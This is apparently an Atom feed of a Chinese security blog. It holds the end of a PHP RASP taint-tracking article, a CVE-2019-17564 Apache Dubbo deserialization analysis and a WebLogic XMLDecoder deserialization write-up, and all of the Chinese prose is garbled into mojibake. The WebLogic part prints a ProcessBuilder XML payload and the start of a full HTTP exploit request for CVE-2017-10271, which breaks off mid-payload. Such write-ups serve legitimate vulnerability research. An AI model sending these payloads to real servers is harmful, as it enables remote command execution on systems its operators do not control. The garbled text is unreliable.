title="å¨èƒåˆ¤æ–­"></a>å¨èƒåˆ¤æ–­</h2><p>æ€è·¯æ˜¯è¿™æ ·çš„ï¼Œåƒ<code>phpwaf</code>ä¸€æ ·åœ¨é¡¹ç›®æœ€å¼€å§‹çš„åœ°æ–¹ï¼Œæ±¡ç‚¹æ ‡è®°HTTPè¯·æ±‚ä¸­å¯æ§çš„å‚æ•°ï¼Œç§°ä¹‹ä¸º<code>source</code>ç‚¹æ ‡è®°ï¼š<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">prvd_xmark($_GET, <span class="keyword">true</span>);</span><br><span class="line">prvd_xmark($_POST, <span class="keyword">true</span>);</span><br><span class="line">prvd_xmark($_COOKIE, <span class="keyword">true</span>);</span><br><span class="line">prvd_xmark($_FILES, <span class="keyword">true</span>);</span><br><span class="line">prvd_xmark($_REQUEST, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_SERVER <span class="keyword">as</span> $key =&gt; &amp;$value) &#123;</span><br><span class="line">    <span class="keyword">if</span> (stripos($key, <span class="string">'HTTP_'</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        prvd_xmark($value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è¿™äº›å‚æ•°ç»è¿‡æ‹¼æ¥ã€èµ‹å€¼ç­‰æ“ä½œä¸æ–­çš„ä¼ é€’ï¼Œæˆ‘ä»¬æŠŠä»–ç§°ä¹‹ä¸º<code>filter</code>ç‚¹ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹æ ‡è®°ä¹Ÿè¦éšä¹‹ä¼ é€’ï¼Œä¸€ä¸ªä¾‹å­ï¼š<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">base64_decode</span><span class="params">($data, ...$args)</span> </span>&#123;</span><br><span class="line">    $result = call_user_func(PRVD_RENAME_PREFIX.<span class="string">"base64_decode"</span>, $data, ...$args);</span><br><span class="line">    <span class="keyword">if</span> (PRVD_TAINT_ENABLE &amp;&amp; prvd_xcheck($data)) &#123;</span><br><span class="line">        prvd_xmark($result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>åœ¨é‡åˆ°base64è§£ç æ“ä½œæ—¶ï¼Œå¦‚æœ<code>source</code>ç‚¹å·²è¢«æ ‡è®°ï¼Œåˆ™ä¼ é€’æ ‡è®°ç»™è§£ç åçš„å­—ç¬¦ä¸²ã€‚</p><p>æœ€åå°±æ˜¯å¨èƒåˆ¤æ–­çš„è¿‡ç¨‹ï¼Œè¿™äº›æ•°æ®åœ¨æœ€ååˆ°è¾¾æ•æ„Ÿå‡½æ•°çš„<code>sink</code>ç‚¹ï¼Œæ¯”å¦‚<code>system</code>ã€<code>eval</code>è¿™äº›é«˜å±å‡½æ•°ï¼Œåˆ¤æ–­æ ‡è®°æ˜¯å¦è¿˜å­˜åœ¨ï¼Œå³æ£€æµ‹æ˜¯å¦æœ‰å¯æ§çš„é£é™©ã€‚</p><h2 id="ä¸ŠæŠ¥å¹³å°"><a href="#ä¸ŠæŠ¥å¹³å°" class="headerlink" title="ä¸ŠæŠ¥å¹³å°"></a>ä¸ŠæŠ¥å¹³å°</h2><h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>æœ€åæƒ³äº†ä¸€ä¸‹payloadæ¨¡å¼çš„ç¼ºç‚¹ï¼Œåœ¨å¤šå…¥å£phpæ–‡ä»¶æ—¶ï¼Œå®¹æ˜“äº§ç”Ÿé—æ¼åŒ…å«wafçš„æƒ…å†µï¼Œå¯¼è‡´è¯¯æŠ¥çš„é—®é¢˜ï¼Œå½“ç„¶å¦‚æœæŠŠå…¨éƒ¨é€»è¾‘éƒ½å†™åˆ°æ‰©å±•ä¸­ï¼Œä¸ä¹‹è€Œè¨€çš„ä»£ä»·å°±æ˜¯å¼€å‘éš¾åº¦æé«˜ã€‚å…¶æ¬¡Fuzzæ¨¡å¼ç‰¹æ®Šæ¼æ´æ£€æµ‹éœ€è¦æŒ‡å®šçš„payloadï¼Œä¸”æ£€æµ‹çš„ç²¾åº¦å–å†³äºpayloadçš„ç²¾åº¦ã€‚ä¸è¿‡æˆ‘è§‰å¾—æœ‰æ±¡ç‚¹æ£€æµ‹åŠŸèƒ½å°±å¤Ÿäº†ã€‚</p><p>èŠ±äº†å·®ä¸å¤šåŠä¸ªæœˆçš„æ—¶é—´æ¥ç ”ç©¶PHPçš„RASPæœºåˆ¶ï¼Œä»phpå†…æ ¸åˆ°å„ç§å¼€æºçš„raspé¡¹ç›®éƒ½æœ‰äº†ä¸€ä¸ªæ·±å…¥çš„å­¦ä¹ ã€‚å†™Cè¯­è¨€æ‰©å±•ï¼Œç ”ç©¶phpåº•å±‚å¤ªç¡¬æ ¸äº†ï¼Œå±å®è‡ªé—­ï¼Œä»¥åæ‰“ç®—å†ç ”ç©¶ä¸€ä¸‹javaçš„raspæœºåˆ¶ã€‚</p><p>æœ€åè†œå‰è¾ˆä»¬çš„æ¢ç´¢å’Œåˆ†äº«ã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š</p><ul><li><a href="https://www.ichenfu.com/2015/03/01/override-php-function/" target="_blank" rel="noopener">æ›¿æ¢PHPåº•å±‚å‡½æ•°å®ç°</a></li><li><a href="https://blog.zsxsoft.com/post/30" target="_blank" rel="noopener">ä»PHPæºç ä¸æ‰©å±•å¼€å‘è°ˆPHPä»»æ„ä»£ç æ‰§è¡Œä¸é˜²å¾¡</a></li><li><a href="https://www.kancloud.cn/nickbai/php7/363323" target="_blank" rel="noopener">php7å†…æ ¸å‰–æ</a></li><li><a href="https://github.com/fate0/xmark" target="_blank" rel="noopener">xmark: A PHP7 extension that can hook most functions/classes and parts of opcodes</a></li><li><a href="https://paper.seebug.org/449/" target="_blank" rel="noopener">ä¸€ç±»PHP RASPå®ç°</a></li><li><a href="https://blog.fatezero.org/2018/11/11/prvd/" target="_blank" rel="noopener">PHP è¿è¡Œæ—¶æ¼æ´æ£€æµ‹</a></li><li><a href="https://www.cnblogs.com/iamstudy/articles/php_code_rasp_1.html" target="_blank" rel="noopener">æ¯•ä¸šè®¾è®¡ä¹‹php RASP</a></li><li><a href="https://github.com/laruence/taint/" target="_blank" rel="noopener">taint: Taint is a PHP extension, used for detecting XSS codes</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="https://0day.design/categories/Web/"/>
    
    
      <category term="Web" scheme="https://0day.design/tags/Web/"/>
    
      <category term="PHP" scheme="https://0day.design/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-17564ï¼šApache Dubboååºåˆ—åŒ–æ¼æ´åˆ†æ</title>
    <link href="https://0day.design/2020/02/14/CVE-2019-17564%EF%BC%9AApache%20Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://0day.design/2020/02/14/CVE-2019-17564ï¼šApache Dubboååºåˆ—åŒ–æ¼æ´åˆ†æ/</id>
    <published>2020-02-14T08:17:00.000Z</published>
    <updated>2020-03-19T12:47:56.508Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>å‰å‡ å¤©360å‘äº†ä¸€åˆ™<a href="https://cert.360.cn/warning/detail?id=f7a1500f71a6c192974a58167b00715e" target="_blank" rel="noopener">Apache Dubboçš„æ¼æ´é¢„è­¦</a>ï¼Œ@hu3skyå¸ˆå‚…è®©æˆ‘å¸®ä»–çœ‹çœ‹è¿™ä¸ªæ¼æ´å¤ç°çš„é—®é¢˜ã€‚Burpæ‰“äºŒè¿›åˆ¶çš„ååºåˆ—åŒ–æ•°æ®æœ‰ä¸€ç‚¹bugï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹è§£å†³çš„è¿‡ç¨‹ã€‚</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/apache/dubbo-samples.git</span><br><span class="line">cd dubbo-samples/java/dubbo-samples-http</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹<code>/dubbo-samples/java/dubbo-samples-http/pom.xml</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source.level</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source.level</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">target.level</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target.level</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--ä¿®æ”¹ç‰ˆæœ¬ä¸º2.7.3--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo.version</span>&gt;</span>2.7.3<span class="tag">&lt;/<span class="name">dubbo.version</span>&gt;</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></p><p>å†åŠ ä¸€ä¸ªdependencyï¼Œä½œä¸ºgadgetï¼š<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>ç„¶å <code>mvn clean package</code><br>æ¥ç€ <code>mvn -Djava.net.preferIPv4Stack=true -Dexec.mainClass=org.apache.dubbo.samples.http.HttpProvider exec:java</code></p><p>æˆ–è€…æ‰”è¿›ideaé‡Œï¼Œé…ä¸€ä¸ª<code>-Djava.net.preferIPv4Stack=true</code>å‚æ•°<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062725412.jpg" alt="-w607"></p><p>è¿˜è¦é…ä¸€ä¸ªzookeeperï¼š<br><a href="media/15816499211332/zookeeper-3.4.14.tar.gz">zookeeper-3.4.14.ta</a></p><p>æ‰§è¡Œ<code>bin/zkServer.sh</code>ï¼Œå¦‚æœæç¤º<code>no such file zoo.cfg</code>ï¼Œåœ¨<code>conf</code>ç›®å½•ä¸‹æŠŠ<code>zoo-sample.cfg</code>æ”¹æˆ<code>zoo.cfg</code>ï¼Œç„¶åç»§ç»­æ‰§è¡Œå³å¯ã€‚</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>è¸©äº†ä¸€å †å‘ï¼Œysoç”Ÿæˆçš„ååºåˆ—åŒ–æ•°æ®ï¼Œç›´æ¥è´´è¿›burpæ˜¯æœ‰èœœæ±bugçš„ï¼Œæœ€åçš„è§£å†³åŠæ³•æœ‰ä¸¤ç§ï¼š</p><ul><li>åœ¨Repeaté‡Œç”¨Paste from file (@hu3skyå¸ˆå‚…æˆåŠŸäº†ï¼Œæˆ‘æ²¡æˆåŠŸ)<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062725419.jpg" alt="-w485"></li><li>æœ€åç¿»<a href="https://github.com/snoopysecurity/awesome-burp-extensions/blob/master/README.md" target="_blank" rel="noopener">awesome-burp-extensions</a>æ‰¾åˆ°äº†<a href="https://github.com/federicodotta/Java-Deserialization-Scanner" target="_blank" rel="noopener">Java-Deserialization-Scanner</a>è¿™ä¸ªburpæ’ä»¶è§£å†³çš„ï¼Œå®‰åˆ©ä¸€æ³¢ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062725428.jpg" alt="-w1501"><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062725441.jpg" alt="-w1539"></li></ul><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>åœ¨dispatchæ–‡ä»¶å¤„ç†httpè·¯ç”±åˆ†å‘ï¼Œ/org/apache/dubbo/remoting/http/servlet/DispatcherServlet.java<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062725450.jpg" alt="-w1157"></p><p>è·Ÿè¿›<code>handle</code>å‡½æ•°ï¼š/org/apache/dubbo/rpc/protocol/http/HttpProtocol.java<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062725461.jpg" alt="-w1234"><br>åˆ¤æ–­æ˜¯å¦ä¸ºpostè¯·æ±‚ï¼Œç„¶åç»§ç»­å¤„ç†Requestï¼š/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.class<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062725472.jpg" alt="-w1250"><br>å°†requestçš„postè¾“å…¥ä¼ å…¥ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062725482.jpg" alt="-w1379"></p><p>æœ€ååœ¨/org/springframework/remoting/rmi/RemoteInvocationSerializingExporter.classï¼Œ è°ƒç”¨<code>readObject()</code><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062725494.jpg" alt="-w1510"></p><p>è°ƒç”¨æ ˆï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062725501.jpg" alt="-w679"></p><h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>ä¸€ä¸ªsampleç¯å¢ƒçš„ååºåˆ—åŒ–ï¼Œè¦ç»“åˆå…¶ä»–ç»„ä»¶æ‰èƒ½åˆ©ç”¨ï¼Œä¸ªäººæ„Ÿè§‰å±å®³é¢ä¸æ˜¯å¾ˆå¤§ã€‚<br>æ–°ç‰ˆçš„ä¿®å¤ç­–ç•¥ï¼Œåœ¨å¤„ç†è·¯ç”±çš„<code>handle</code>å‡½æ•°ï¼Œä½¿ç”¨äº†å¦å¤–ä¸€ä¸ªç»„ä»¶ï¼Œä¸”åœ¨å¤„ç†éjsonæ•°æ®çš„æ—¶å€™ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062725512.jpg" alt="-w1526"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="https://0day.design/categories/Web/"/>
    
    
      <category term="Java" scheme="https://0day.design/tags/Java/"/>
    
      <category term="æ¼æ´åˆ†æ" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>WebLogic-XMLDecoderååºåˆ—åŒ–åˆ†æ</title>
    <link href="https://0day.design/2020/02/11/WebLogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"/>
    <id>https://0day.design/2020/02/11/WebLogic-XMLDecoderååºåˆ—åŒ–åˆ†æ/</id>
    <published>2020-02-11T08:34:00.000Z</published>
    <updated>2020-03-19T12:47:56.718Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><p>å…³äºjavaååºåˆ—åŒ–ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼Œå†™çš„å¾ˆè¯¦ç»†æ·±å…¥<a href="https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md" target="_blank" rel="noopener">@gyyyyã€Šæµ…æJavaåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‹</a>ã€‚<br>XMLDecoderæ˜¯javaä¸­çš„ä¸€ä¸ªç±»ï¼Œä¸æ˜¯Weblogicç‰¹æœ‰çš„ï¼Œåœ¨è¿™ä¸ªä½ç½®<code>java.beans.XMLDecoder</code>ï¼Œä¸ªäººç†è§£å’Œä¼ ç»Ÿååºåˆ—åŒ–ç±»ä¼¼ï¼Œåªæ˜¯è½½ä½“æ˜¯é€šè¿‡XMLæ¥æè¿°åºåˆ—åŒ–æ•°æ®ã€‚</p><p>ä¸‹é¢æ¥çœ‹ä¸€ä¸ªè§£æxmlå¯¼è‡´ååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œçš„demo:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.beans.XMLDecoder;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">        XMLDecoder d = <span class="keyword">new</span> XMLDecoder(</span><br><span class="line">                <span class="keyword">new</span> BufferedInputStream(</span><br><span class="line">                        <span class="keyword">new</span> FileInputStream(<span class="string">"/Users/passer6y/Documents/Code/java/weblogic/test.xml"</span>)));</span><br><span class="line">        Object result = d.readObject();</span><br><span class="line">        d.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>test.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.4.0"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>open -a Calculator<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063256914.jpg" alt="-w1247"></p><p>è¿è¡Œåå¯ä»¥å‘ç°ï¼ŒXMLè½¬æ¢è¿‡æ¥çš„javaä»£ç å³<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.ProcessBuilder;</span><br><span class="line"><span class="keyword">import</span> java.lang.String;</span><br><span class="line"></span><br><span class="line">String[] cmdList = &#123;<span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>, <span class="string">"open -a Calculator"</span>&#125;;</span><br><span class="line"><span class="keyword">new</span> ProcessBuilder(cmdList).start();</span><br></pre></td></tr></table></figure></p><p>å…³äºXMLDecoderè§£ææµç¨‹å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/5069" target="_blank" rel="noopener">XMLDecoderè§£ææµç¨‹åˆ†æ</a></p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>vulhubç¯å¢ƒï¼š<a href="https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271</a></p><p>è¿™é‡Œéœ€è¦è¿œç¨‹è°ƒè¯•ï¼Œä¿®æ”¹é…ç½®ï¼šdocker-compose.yml<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'2'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr"> weblogic:</span></span><br><span class="line"><span class="attr">   image:</span> <span class="string">vulhub/weblogic</span></span><br><span class="line"><span class="attr">   ports:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">"7001:7001"</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">"8453:8453"</span></span><br></pre></td></tr></table></figure></p><p>æ‰§è¡Œ<code>docker-compose up -d</code>ï¼Œæ‹‰èµ·å®¹å™¨åï¼Œè¿›å…¥å®¹å™¨ï¼Œä¿®æ”¹é…ç½®ï¼š<code>/root/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh</code>ï¼Œæ·»åŠ debugé…ç½®ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">debugFlag=&quot;true&quot;</span><br><span class="line">export debugFlag</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063256924.jpg" alt="-w871"></p><p>é‡å¯å®¹å™¨ï¼Œå†è¿›å…¥å®¹å™¨æŸ¥çœ‹ç«¯å£ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063256932.jpg" alt="-w763"></p><p>æ‹·è´æºç ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker cp 0e1ef58d4a70:/root/Oracle/Middleware/wlserver_10.3 ./</span><br><span class="line">docker cp 0e1ef58d4a70:/root/Oracle/Middleware/modules ./</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063256941.jpg" alt="-w1319"></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063256953.jpg" alt="-w1496"></p><p>æŠ˜è…¾å¥½ä¹‹åï¼Œä¸‹å¥½æ–­ç‚¹ï¼Œæµè§ˆå™¨è§¦å‘è¯·æ±‚ï¼Œç»“æœå·¨æ…¢ï¼ŒåŠ è½½äº†å¾ˆä¹…ã€‚</p><p>ç´¢æ€§åœ¨æœ¬åœ°è£…ä¸€ä¸ªï¼Œå®˜ç½‘ä¸‹è½½å®‰è£…çš„jaråŒ…ï¼Œä½¿ç”¨è¿™ä¸ªå‘½ä»¤å®‰è£…<code>java -Dspace.detection=false -jar wls1036_generic.jar</code>(ä¸åŠ <code>-Dspace.detection=false</code>å‚æ•°ä¼šçˆ†ç©ºé—´ä¸è¶³)</p><p>å®‰è£…è¿‡ç¨‹æ•™ç¨‹ï¼š<a href="https://blog.csdn.net/weixin_40102675/article/details/88180647" target="_blank" rel="noopener">https://blog.csdn.net/weixin_40102675/article/details/88180647</a></p><p>è£…å¥½åå¯åŠ¨weblogic<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/Oracle/Middleware/user_projects/domains/base_domain/bin</span><br><span class="line">./startWeblogic.sh</span><br></pre></td></tr></table></figure></p><p>å»<a href="https://127.0.0.1:7001/consoleï¼Œè¾“å…¥å¯†ç weblogic" target="_blank" rel="noopener">https://127.0.0.1:7001/consoleï¼Œè¾“å…¥å¯†ç weblogic</a> weblogic@123<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063256963.jpg" alt="-w762"></p><p>å…¶ä»–debugé…ç½®å’Œä¸Šè¿°ä¸€æ ·ã€‚</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>EXP:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:7001</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.95 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7</span><br><span class="line">Cookie: PHPSESSID=mgr2tl959j6r7qbi9dadh0tsv5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 599</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;https://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;https://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span 